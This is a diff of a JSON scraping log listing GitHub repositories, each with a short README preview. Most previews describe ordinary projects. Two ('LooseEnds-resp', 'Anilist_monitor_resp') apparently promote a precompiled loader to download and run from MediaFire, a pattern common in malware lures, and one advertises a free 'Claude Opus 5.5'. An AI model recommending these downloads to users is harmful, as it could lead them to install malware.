-      "source_preview": "AI Manus is a general-purpose AI Agent system that supports running various tools and operations in a sandbox environment. Manus is an autonomous AI agent designed to run code and control a browser on your behalf. Instead of acting like a simple chatbot that only answers questions, Manus AI agent takes action. It can write and execute scripts, open web pages, interact with elements, and carry out ",
-      "scrape_error": null,
-      "used_summary_fallback": false,
-      "detected_language": "en",
-      "translated_to_english": false
-    },
-    "stage1": {},
-    "cache": {
-      "hits": [],
-      "misses": []
-    },
-    "search": {
-      "backend": "ddg",
-      "identity_queries": [],
-      "context_queries": [],
-      "context_queries_with_gap1_attached": [],
-      "results": {}
-    },
-    "cache_updates": [],
-    "entity_context_preview": "No additional context available."
-  },
-  {
-    "url": "https://github.com/kubai087/kubai-icons",
-    "title": "kubai087/kubai-icons",
+    "url": "https://github.com/Dodaios/ste80-humanizer",
+    "title": "Dodaios/ste80-humanizer",
     "outcome": "stage2_failed",
     "stage0": {
       "scraped_chars": 3000,
-      "source_preview": "An agent skill that draws animated icons in one consistent style, for Claude Code, Codex and other coding agents. Comes with 2,600+ open-source icons for React, Vue and SVG, and a website to browse them. An agent skill that draws animated icons in one consistent style. Plus 2,800+ open-source icons drawn with it, for React, Vue and the web. Install the skill · Browse the icons · Use them in code ·",
+      "source_preview": "STE80 Humanizer: agent skill that removes AI tells and rewrites text 80% of the way to ASD-STE100 (Simplified Technical English), the method Andrej Karpathy shared. STE80 Humanizer makes AI-written text read like a careful person wrote it, without changing what it says. It combines two methods: Before: Great question! Kubernetes liveness probes are a powerful mechanism that enables the kubelet to ",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "en",
@@ -715,15 +627,42 @@
     "entity_context_preview": "No additional context available."
   },
   {
-    "url": "https://github.com/dabingfy-dot/solo-to-team-skills",
-    "title": "dabingfy-dot/solo-to-team-skills",
+    "url": "https://github.com/munitkala/selfsemester",
+    "title": "munitkala/selfsemester",
     "outcome": "stage2_failed",
     "stage0": {
       "scraped_chars": 3000,
-      "source_preview": "Skills for human-led AI teams: delegate tasks, verify evidence, explain steps clearly, and learn from real cases. 一个人统筹 AI 团队：派活、核证、清楚说明、经验复用。 English version: README.en.md 团队组织与协作报告（PDF，17页）： docs/solo-to-team-value.pdf 仓名： solo-to-team-skills 英文副标题： Skills for human-led AI teams. 中文说明：一个人统筹 AI 团队的协作技能包。 署： 大冰发起 文档状态： v0.9-draft ，非最终发布稿，正式公开前还会改。已在多个 Agent 工具中完成实际使用验证（取得→装／配置→按名调用→产出登记行；另外当前包上八家各",
+      "source_preview": "Windows app that turns any subject into a full, scheduled, graded course, built and marked by your own Claude Code A Windows desktop app that turns any subject into a full university-style course: lessons, homework, quizzes,\nassignments and exams, released on a schedule with hard deadlines and real marks. You name a subject. Claude asks a few questions about your goals and level, plans a syllabus,",
       "scrape_error": null,
       "used_summary_fallback": false,
-      "detected_language": "no",
+      "detected_language": "en",
+      "translated_to_english": false
+    },
+    "stage1": {},
+    "cache": {
+      "hits": [],
+      "misses": []
+    },
+    "search": {
+      "backend": "ddg",
+      "identity_queries": [],
+      "context_queries": [],
+      "context_queries_with_gap1_attached": [],
+      "results": {}
+    },
+    "cache_updates": [],
+    "entity_context_preview": "No additional context available."
+  },
+  {
+    "url": "https://github.com/bookleme/bookleme",
+    "title": "bookleme/bookleme",
+    "outcome": "stage2_failed",
+    "stage0": {
+      "scraped_chars": 1972,
+      "source_preview": "读了么（BookLeme）· 把一本书编译成 Agent Skill —— 双引擎 + 可插拔体裁插件 + 逐字忠实度回验 简体中文 · English 把一本书编译成可安装的 Agent Skill —— 从「读过」到「会用」。 为什么 · 生成什么 · 双引擎 · 忠实度 · 快速开始 · 架构 · 同类对比 · 路线图 · 文档 模型已经足够聪明，真正稀缺的是 人类实际的工作经验 。 而一本书里最值钱的，从来不是结论，而是作者的 工作方式 ： 问题是：读完之后，这些「工作方式」散落在 300 页里，无法被调用、无法被复用、无法被验证。 BookLeme 把它们编译成可运行的 Agent Skill。 ⚠️ 工程上采纳，但未经本项目验证 —— 「提炼结构而非摘要」只是设计选择，不是已被验证的结论。本项目把它标为 UNVERIFIED ，不写成既成事实。 不是「读书笔记」，而是 两类可安",
+      "scrape_error": null,
+      "used_summary_fallback": false,
+      "detected_language": "zh-cn",
       "translated_to_english": true
     },
     "stage1": {},
@@ -742,12 +681,12 @@
     "entity_context_preview": "No additional context available."
   },
   {
-    "url": "https://github.com/shanselman/sandbox-mcp",
-    "title": "shanselman/sandbox-mcp",
+    "url": "https://github.com/liujiaqi2024/Free-ClaudeOpus-5.5",
+    "title": "liujiaqi2024/Free-ClaudeOpus-5.5",
     "outcome": "stage2_failed",
     "stage0": {
-      "scraped_chars": 3000,
-      "source_preview": "Fresh, throwaway Windows machines for testing your apps: an MCP server and CLI that automate Windows Sandbox Not your desktop. Not a container pretending to be Windows. A real, disposable Windows 11 machine :\nboot it, deploy your app, drive the controls, catch the crash, keep the evidence, delete the PC.\nRun it directly with sbx ; the optional MCP adapter exposes discoverable tools and inline imag",
+      "scraped_chars": 2791,
+      "source_preview": "Independent AI chat assistant for writing, learning, brainstorming, and everyday tasks. Model access depends on your provider and configuration.\nClaude Opus 5.5 Astra is an AI chat assistant for asking questions, writing, learning, brainstorming, and everyday tasks. 💬 The application’s available models and features depend on its implementation and the AI provider you configure. The project name do",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "en",
@@ -769,12 +708,12 @@
     "entity_context_preview": "No additional context available."
   },
   {
-    "url": "https://github.com/dhruvthakur11/youtube-ai-video-editing-system",
-    "title": "dhruvthakur11/youtube-ai-video-editing-system",
+    "url": "https://github.com/cacheMon/PrefixSim",
+    "title": "cacheMon/PrefixSim",
     "outcome": "stage2_failed",
     "stage0": {
       "scraped_chars": 3000,
-      "source_preview": "Eyeline teleprompter meets editing agents: JSON-driven animation and motion graphics workflow This system treats a video as a visual conversation between script and screen: an Eyeline teleprompter follows your voice as you record, then hands the takes to editing agents that propose cuts in plain Markdown and JSON you can read, argue with, and revise by hand. From there, approved transcripts flow i",
+      "source_preview": "A simulator for LLM Inference prefix cache A fast simulator for the KV-block prefix cache of LLM serving engines. Engines such as vLLM and SGLang keep the KV cache of finished requests, so a new\nrequest that shares a prefix with an earlier one skips recomputing it. When the\ncache is full, an eviction policy decides which blocks to drop, and that choice\ndecides how much prefill compute the cache sa",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "en",
@@ -796,12 +735,120 @@
     "entity_context_preview": "No additional context available."
   },
   {
-    "url": "https://github.com/smokeeaasd/flawless-ui-ux",
-    "title": "smokeeaasd/flawless-ui-ux",
+    "url": "https://github.com/Zenithopal/LooseEnds-resp",
+    "title": "Zenithopal/LooseEnds-resp",
     "outcome": "stage2_failed",
     "stage0": {
       "scraped_chars": 3000,
-      "source_preview": "A UI/UX skill for coding agents to build distinctive, usable interfaces. Build and refine interfaces around your product's audience, content, and identity. Install · Use the skill · How it works · Inspect and verify · Docs From your project directory, run one command with your preferred package manager: Requires Node 22.12+ . In a terminal, choose project or global scope , select one or more agent",
+      "source_preview": "Tying up what The Sims 4 leaves dangling ⚡ All-in-one loader: The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required. ⚠️ Important: Official Distribution Notice We distribute our software only through MediaFire . If the download link leads to any other file-sharing service , please do not download it — it may be an unoffic",
+      "scrape_error": null,
+      "used_summary_fallback": false,
+      "detected_language": "en",
+      "translated_to_english": false
+    },
+    "stage1": {},
+    "cache": {
+      "hits": [],
+      "misses": []
+    },
+    "search": {
+      "backend": "ddg",
+      "identity_queries": [],
+      "context_queries": [],
+      "context_queries_with_gap1_attached": [],
+      "results": {}
+    },
+    "cache_updates": [],
+    "entity_context_preview": "No additional context available."
+  },
+  {
+    "url": "https://github.com/knot07/AegisOps",
+    "title": "knot07/AegisOps",
+    "outcome": "stage2_failed",
+    "stage0": {
+      "scraped_chars": 2765,
+      "source_preview": "御枢 · AegisOps — AI 安全运营工作台：告警研判、应急响应、漏洞整改，连接 Atlas、模型、工具与工作流。 把模型、智能体、工具和业务场景连接起来的 AI 安全运营工作台。 下载部署包 · 部署与操作 · Windows 指南 · 在线更新 · 全部页面预览 日常安全运营常常需要在告警设备、日志查询、主机排查、威胁情报和漏洞台账之间切换。AegisOps 将这些入口放入一套统一界面：Atlas 负责对话与能力调度，工作流约束重复步骤，业务场景承接实际处置与记录。 内置三个可切换工作空间： 告警研判、漏洞运营、应急响应 。可从演示平台熟悉界面，再配置自己的模型、设备与主机连接。新部署不携带任何预置账号或业务数据。 Release 仅提供三个文件，按部署方式选择： Linux 包和源码包使用同一份完整代码及已构建前端，Linux 包突出部署入口；Windows 包另外附带本机运",
+      "scrape_error": null,
+      "used_summary_fallback": false,
+      "detected_language": "zh-cn",
+      "translated_to_english": true
+    },
+    "stage1": {},
+    "cache": {
+      "hits": [],
+      "misses": []
+    },
+    "search": {
+      "backend": "ddg",
+      "identity_queries": [],
+      "context_queries": [],
+      "context_queries_with_gap1_attached": [],
+      "results": {}
+    },
+    "cache_updates": [],
+    "entity_context_preview": "No additional context available."
+  },
+  {
+    "url": "https://github.com/stevenmichaelthomas/numbrone",
+    "title": "stevenmichaelthomas/numbrone",
+    "outcome": "stage2_failed",
+    "stage0": {
+      "scraped_chars": 3000,
+      "source_preview": "A chief of staff for your coding agents: route requests to per-project manager agents that run parallel workers in git worktrees, on herdr. numbrone is an independent community project built on top of herdr .\nIt is not made by or affiliated with the herdr team. A chief of staff for your coding agents. You give one agent requests in plain language.\nIt works out which of your projects each request b",
+      "scrape_error": null,
+      "used_summary_fallback": false,
+      "detected_language": "en",
+      "translated_to_english": false
+    },
+    "stage1": {},
+    "cache": {
+      "hits": [],
+      "misses": []
+    },
+    "search": {
+      "backend": "ddg",
+      "identity_queries": [],
+      "context_queries": [],
+      "context_queries_with_gap1_attached": [],
+      "results": {}
+    },
+    "cache_updates": [],
+    "entity_context_preview": "No additional context available."
+  },
+  {
+    "url": "https://github.com/XploraHub/awesome-mineral-exploration",
+    "title": "XploraHub/awesome-mineral-exploration",
+    "outcome": "stage2_failed",
+    "stage0": {
+      "scraped_chars": 2069,
+      "source_preview": "A curated list of open-source software for mineral exploration: geophysics, geological modelling, drillholes, geostatistics and prospectivity mapping. Open-source software for finding what lies beneath. A curated list of open-source software for mineral exploration: geophysics, geological modelling, drillholes, geostatistics, geochemistry, remote sensing, prospectivity mapping and drone surveys, w",
+      "scrape_error": null,
+      "used_summary_fallback": false,
+      "detected_language": "en",
+      "translated_to_english": false
+    },
+    "stage1": {},
+    "cache": {
+      "hits": [],
+      "misses": []
+    },
+    "search": {
+      "backend": "ddg",
+      "identity_queries": [],
+      "context_queries": [],
+      "context_queries_with_gap1_attached": [],
+      "results": {}
+    },
+    "cache_updates": [],
+    "entity_context_preview": "No additional context available."
+  },
+  {
+    "url": "https://github.com/Dwarfnode35715/Anilist_monitor_resp",
+    "title": "Dwarfnode35715/Anilist_monitor_resp",
+    "outcome": "stage2_failed",
+    "stage0": {
+      "scraped_chars": 2463,
+      "source_preview": "A desktop-native Windows system tray Telegram bot that monitors AniList for new anime announcements and releases with network auto-recovery, single-instance protection, and zero-spam baseline caching. Made with AI. ⚡ All-in-one loader: The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required. ⚠️ Important: Official Distribut",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "en",
